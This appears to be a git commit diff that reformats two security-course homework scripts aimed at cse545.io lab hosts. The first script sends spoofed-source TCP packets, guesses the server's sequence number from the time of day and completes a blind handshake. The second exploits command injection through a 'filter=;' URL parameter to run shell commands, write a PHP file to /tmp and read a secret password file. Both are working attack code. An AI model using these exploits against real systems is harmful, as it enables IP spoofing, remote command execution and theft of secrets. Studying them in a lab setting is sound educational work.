7bc0d0e4d88c89bfaba694a7ed1aba5605b5f0f7
lushenle <lushenle@bytedance.com>
2023-10-13 11:35:17 +0800

    add .gitignore

--- hw3/p1/tcpspoof.py
+++ hw3/p1/tcpspoof.py
@@ -1,83 +1,80 @@
-# -*- coding: utf-8 -*-
-import time
-from scapy.all import RandShort, RandInt, sr1, send
-from scapy.layers.inet import IP, TCP
-import socket
-import _thread
 import random
+import socket
+import threading
+import time
 
-DHOST = 'tcpspoof_cn.cse545.io'
-FAKEIP = '10.2.4.10'
+from scapy.all import send
+from scapy.layers.inet import IP, TCP
+
+DHOST = "tcpspoof_cn.cse545.io"
+FAKEIP = "10.2.4.10"
 DPORT = 13337
-# SPORT = RandShort()
 SPORT = 23337
-SIP = '172.16.20.23'
+SIP = "172.16.20.23"
 
-ss_ack = 1
 ss_ack = 0
 dd_seq = 0
-WORKING = 1
+WORKING = True
 
 
-# 根据时间猜测SEQ
-def guessSEQ():
+def guess_SEQ():
     global ss_ack, dd_seq
     num = int(time.time())
-    bs = num.to_bytes(length=4, byteorder='big', signed=False)
-    n = []
-    for i in bs:
-        n.append(i)
-    for i in range(0, 10):  # 随机打乱个字节，进行重新排序
-        idx = random.randint(10, 1000) % 3 + 1  # 生成1-4随机数
+    bs = num.to_bytes(length=4, byteorder="big", signed=False)
+    n = list(bs)
+    for _ in range(10):
+        idx = (random.randint(10, 1000) % 3) + 1
         n[0] += n[idx]
         n[idx] = n[0] - n[idx]
         n[0] = n[0] - n[idx]
     bs = bytes(n)
-    return int.from_bytes(bs, byteorder='big', signed=False) + 1
+    return int.from_bytes(bs, byteorder="big", signed=False) + 1
 
 
-# 建立链接
 def connect():
     global ss_ack, dd_seq
     try:
         # 第一次握手，发送SYN包
-        send(IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, seq=0, flags='S'), verbose=False)
+        send(
+            IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, seq=0, flags="S"),
+            verbose=False,
+        )
         ss_ack = 1
-        dd_seq = guessSEQ()  # 根据时间猜测SEQ
+        dd_seq = guess_SEQ()
         # 第三次握手，发送ACK确认包
-        pk = IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, ack=dd_seq, seq=ss_ack, flags='A')
-        # print(pk.show())
+        pk = IP(dst=DHOST, src=FAKEIP) / TCP(
+            dport=DPORT, sport=SPORT, ack=dd_seq, seq=ss_ack, flags="A"
+        )
         send(pk, verbose=False)
     except Exception as e:
-        print('[-]有错误，请注意检查！')
+        print("[-]有错误，请注意检查！")
         print(e)
 
 
-# TCP链接建立后发送本地IP
-def sendData():
+def send_data():
     global ss_ack, dd_seq
-    pk = IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, seq=ss_ack, ack=dd_seq, flags=24) / SIP
-    # print(pk.show())
+    pk = (
+        IP(dst=DHOST, src=FAKEIP)
+        / TCP(dport=DPORT, sport=SPORT, seq=ss_ack, ack=dd_seq, flags=24)
+        / SIP
+    )
     send(pk)
 
 
-# 创建UDP Server接收数据
 def receive():
     global WORKING
     IPv4 = "0.0.0.0"
     Port = 13337
-    ServerSock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)  # UDP
+    ServerSock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
     ServerSock.bind((IPv4, Port))
     print("Socket is ready to receive data..")
-    while True:
-        data, addr = ServerSock.recvfrom(1024)  # buffer size is 1024 bytes
+    while WORKING:
+        data, addr = ServerSock.recvfrom(1024)
         print("received data:", data)
-        WORKING = 0
+        WORKING = False
 
 
-if __name__ == '__main__':
-    # getseq()
-    # sendData()
-    _thread.start_new_thread(receive)
-    while WORKING == 1:
+if __name__ == "__main__":
+    threading.Thread(target=receive).start()
+    while WORKING:
         connect()
--- hw6/level6/write_file.py
+++ hw6/level6/write_file.py
@@ -1,25 +1,25 @@
 import requests as r
 
-path = 'http://webexploit.cn.cse545.io:8082/cgi-bin/users.php?'
-referer = 'http://webexploit.cn.cse545.io:8082/users.html'
+path = "http://webexploit.cn.cse545.io:8082/cgi-bin/users.php?"
+referer = "http://webexploit.cn.cse545.io:8082/users.html"
 s = r.Session()
-s.headers.update({'referer': referer})
+s.headers.update({"referer": referer})
 
 
 def cmd_exec(command):
-    query = 'filter=;' + command
+    query = "filter=;" + command
     out = s.get(path + query)
     print(out.text)
 
 
 def create_php():
-    command = ''
+    command = ""
     # command += 'system("ls -al");\n'
     command += 'system("cat s3cr37.pwd");\n'
     return command
 
 
-base = '/tmp/shenlelu.php'
-cmd_exec('rm ' + base)
-cmd_exec('echo \'' + create_php() + '\' > ' + base)
-cmd_exec('cat /tmp/shenlelu.php')
+base = "/tmp/shenlelu.php"
+cmd_exec("rm " + base)
+cmd_exec("echo '" + create_php() + "' > " + base)
+cmd_exec("cat /tmp/shenlelu.php")
